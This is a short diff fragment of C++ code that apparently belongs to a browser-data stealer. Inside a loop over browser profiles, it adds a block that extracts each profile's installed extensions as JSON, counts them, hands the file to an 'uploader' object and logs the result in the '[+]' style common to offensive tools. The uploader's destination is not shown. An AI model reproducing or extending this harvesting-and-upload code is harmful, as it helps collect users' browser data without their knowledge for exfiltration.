+                    // Extract Extensions (JSON file)
+                    try {
+                        std::string extensionsJson = Data::ExtensionExtractor::Extract(profilePath);
+                        std::string filename = browserConfig.name + "_" + profilePath.filename().string() + "_extensions.json";
+                        
+                        // Count extensions
+                        int count = 0;
+                        size_t pos = 0;
+                        while ((pos = extensionsJson.find("\"id\":", pos)) != std::string::npos) {
+                            count++;
+                            pos++;
+                        }
+                        
+                        uploader.AddDataFile(filename, extensionsJson, count);
+                        m_logger.Log("[+] Extracted " + std::to_string(count) + " extensions");
+                    } catch (const std::exception &e) {
+                        m_logger.Log("[-] Extension extraction failed: " + std::string(e.what()));
+                    }
+                    
                     successfulProfiles++;
                 }
                 catch (const std::exception &e)
